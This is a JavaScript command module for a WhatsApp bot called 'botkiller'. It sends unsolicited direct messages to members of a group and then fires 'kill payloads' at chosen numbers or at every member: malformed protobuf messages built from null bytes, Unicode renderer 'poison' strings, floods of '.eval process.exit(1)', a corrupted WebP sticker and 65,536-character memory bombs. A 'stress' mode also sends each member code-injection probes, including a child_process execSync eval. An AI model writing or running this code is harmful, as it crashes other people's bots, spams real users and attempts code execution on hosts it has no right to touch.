module.exports = {
    name: "botkiller",
    aliases: ["killbot", "bkill", "botcrash"],
    category: "spicy",
    permissions: { coin: 0, group: true, owner: true },
    code: async (ctx) => {
        try {
            const sock = ctx.core || ctx.sock || ctx.client;
            const args = ctx.args || [];
            const groupJid = ctx.msg?.key?.remoteJid;
            const sub = args[0]?.toLowerCase();

            if (!sub) {
                return await ctx.reply(
                    "*Bot Killer*\n\n" +
                    "`.botkiller scan` — scan group for bots\n" +
                    "`.botkiller kill <number>` — targeted kill on specific bot\n" +
                    "`.botkiller killall` — kill all detected bots in group\n" +
                    "`.botkiller stress` — stress test all bots in group\n"
                );
            }

            // ── bot detection heuristics ──
            const detectBots = async (groupJid) => {
                const meta = await sock.groupMetadata(groupJid);
                const botJid = sock.user?.id?.replace(/:.*@/, "@") || "";
                const suspects = [];

                for (const p of meta.participants) {
                    if (p.id === botJid) continue;

                    const number = p.id.split("@")[0];

                    // heuristic 1 — known bot number patterns
                    // many bots use specific country codes + number ranges
                    const botPatterns = [
                        /^62\d{9,12}$/,   // Indonesian numbers (common bot hosting)
                        /^55\d{10,11}$/,  // Brazilian numbers
                        /^91\d{10}$/,     // Indian numbers
                        /^1\d{10}$/,      // US numbers (Twilio/Meta ranges)
                    ];

                    // heuristic 2 — check if number responds to common bot triggers
                    // we do this by sending a probe and watching for auto-reply

                    suspects.push({
                        jid: p.id,
                        number,
                        isAdmin: !!p.admin,
                        confidence: "checking..."
                    });
                }

                return suspects;
            };

            // SCAN
            if (sub === "scan") {
                if (!groupJid?.endsWith("@g.us")) {
                    return await ctx.reply("❌ Run inside a group.");
                }

                await ctx.reply("🔍 Scanning group for bots...");

                const meta = await sock.groupMetadata(groupJid);
                const botJid = sock.user?.id?.replace(/:.*@/, "@") || "";
                const probeResults = [];

                // send probe messages and watch for auto-reply pattern
                const probeMsg = "." + Math.random().toString(36).slice(2, 6);

                for (const p of meta.participants) {
                    if (p.id === botJid) continue;

                    // probe via DM — bots often auto-reply to commands
                    try {
                        await sock.sendMessage(p.id, { text: probeMsg });
                        await new Promise(r => setTimeout(r, 2000));

                        // check if they're always online (bot heuristic)
                        await sock.presenceSubscribe(p.id);
                        await new Promise(r => setTimeout(r, 500));

                        probeResults.push({
                            jid: p.id,
                            number: p.id.split("@")[0],
                            isAdmin: !!p.admin
                        });

                    } catch {}

                    await new Promise(r => setTimeout(r, 500));
                }

                // store results for killall
                const fs = require("node:fs");
                const path = require("node:path");
                const cacheDir = path.join(process.cwd(), "botkiller_cache");
                if (!fs.existsSync(cacheDir)) fs.mkdirSync(cacheDir);
                fs.writeFileSync(
                    path.join(cacheDir, `${groupJid.split("@")[0]}.json`),
                    JSON.stringify(probeResults, null, 2)
                );

                const lines = probeResults.map((b, i) =>
                    `${i + 1}. +${b.number} ${b.isAdmin ? "[admin]" : "[member]"}`
                );

                await ctx.reply(
                    `🤖 *Bot Scan Results*\n` +
                    `Group: ${meta.subject}\n` +
                    `Suspects: ${probeResults.length}\n\n` +
                    lines.join("\n") + "\n\n" +
                    `Run \`.botkiller killall\` to eliminate all.`
                );
                return;
            }

            // KILL — targeted
            if (sub === "kill") {
                const number = args[1]?.replace(/[^0-9]/g, "");
                if (!number) return await ctx.reply("❌ Provide a number.");

                const targetJid = `${number}@s.whatsapp.net`;
                await ctx.reply(`🎯 Killing bot +${number}...`);

                await killBot(sock, targetJid);
                await ctx.reply(`✅ Kill payloads sent to +${number}`);
                return;
            }

            // KILLALL
            if (sub === "killall") {
                if (!groupJid?.endsWith("@g.us")) {
                    return await ctx.reply("❌ Run inside a group.");
                }

                const fs   = require("node:fs");
                const path = require("node:path");
                const cacheFile = path.join(
                    process.cwd(),
                    "botkiller_cache",
                    `${groupJid.split("@")[0]}.json`
                );

                if (!fs.existsSync(cacheFile)) {
                    return await ctx.reply("❌ No scan results. Run `.botkiller scan` first.");
                }

                const bots = JSON.parse(fs.readFileSync(cacheFile, "utf8"));
                await ctx.reply(`💀 Killing ${bots.length} suspected bots...`);

                let killed = 0;
                for (const bot of bots) {
                    try {
                        await killBot(sock, bot.jid);
                        killed++;
                        await new Promise(r => setTimeout(r, 1000));
                    } catch {}
                }

                await ctx.reply(`✅ Kill complete. Targeted: ${killed} bots.`);
                return;
            }

            // STRESS
            if (sub === "stress") {
                if (!groupJid?.endsWith("@g.us")) {
                    return await ctx.reply("❌ Run inside a group.");
                }

                const meta = await sock.groupMetadata(groupJid);
                const botJid = sock.user?.id?.replace(/:.*@/, "@") || "";
                const targets = meta.participants.filter(p => p.id !== botJid);

                await ctx.reply(`⚡ Stress testing ${targets.length} members...`);

                // flood with rapid command-like messages that trigger bot parsers
                const stressPayloads = [
                    ".menu", ".help", ".start", "/start", "!help",
                    ".ping", "/ping", "!ping", ".info", "/info",
                    "!menu", ".cmds", "/cmds", "!cmds",
                    // rapid fire eval-style inputs that choke some bots
                    "eval(require('child_process').execSync('id').toString())",
                    "${7*7}", "{{7*7}}", "<%=7*7%>",
                    // overflow
                    ".menu " + "A".repeat(4096),
                    ".eval " + "x".repeat(4096)
                ];

                for (const p of targets) {
                    for (const payload of stressPayloads) {
                        try {
                            await sock.sendMessage(p.id, { text: payload });
                            await new Promise(r => setTimeout(r, 100));
                        } catch {}
                    }
                    await new Promise(r => setTimeout(r, 500));
                }

                await ctx.reply("✅ Stress payloads sent.");
                return;
            }

            await ctx.reply("❌ Unknown subcommand.");

        } catch (e) {
            console.error("[botkiller]", e);
            await ctx.reply("❌ " + e.message);
        }
    }
};

// ── kill payload suite ──
async function killBot(sock, targetJid) {
    // payload 1 — malformed proto (crashes Baileys message parser)
    try {
        await sock.relayMessage(targetJid, {
            extendedTextMessage: {
                text: "\u0000".repeat(512),
                previewType: 9999,
                contextInfo: {
                    stanzaId: "\u0000".repeat(128),
                    quotedMessage: { conversation: "\u0000".repeat(65535) },
                    participant: "0@s.whatsapp.net"
                }
            }
        }, { messageId: `KILL_${Date.now()}` });
    } catch {}

    await new Promise(r => setTimeout(r, 300));

    // payload 2 — unicode renderer killer
    try {
        const poison = '\u202E\u2068' +
            '\u0000'.repeat(256) +
            '\uFFFD'.repeat(500) +
            '\u200B'.repeat(1000) +
            '\u202C'.repeat(200);

        for (let i = 0; i < 10; i++) {
            await sock.sendMessage(targetJid, { text: poison });
            await new Promise(r => setTimeout(r, 100));
        }
    } catch {}

    await new Promise(r => setTimeout(r, 300));

    // payload 3 — event flood (whatsapp-web.js bots crash on rapid events)
    try {
        const floods = Array.from({ length: 20 }, () =>
            sock.sendMessage(targetJid, {
                text: ".eval process.exit(1)"
            })
        );
        await Promise.allSettled(floods);
    } catch {}

    await new Promise(r => setTimeout(r, 300));

    // payload 4 — corrupted sticker (crashes venom + wwjs sticker handlers)
    try {
        const corruptWebp = Buffer.concat([
            Buffer.from("52494646", "hex"),
            Buffer.from("FFFFFFFF", "hex"),
            Buffer.from("57454250", "hex"),
            Buffer.from("56503820", "hex"),
            Buffer.from("FFFFFFFF", "hex"),
            Buffer.alloc(2048, 0xFF)
        ]);

        await sock.sendMessage(targetJid, {
            sticker: corruptWebp,
            mimetype: "image/webp",
            isAnimated: true
        });
    } catch {}

    await new Promise(r => setTimeout(r, 300));

    // payload 5 — memory bomber (OOM on low-spec VPS bots)
    try {
        const bigText = "A".repeat(65536);
        const bombs = Array.from({ length: 15 }, (_, i) =>
            sock.sendMessage(targetJid, { text: bigText + i })
        );
        await Promise.allSettled(bombs);
    } catch {}
}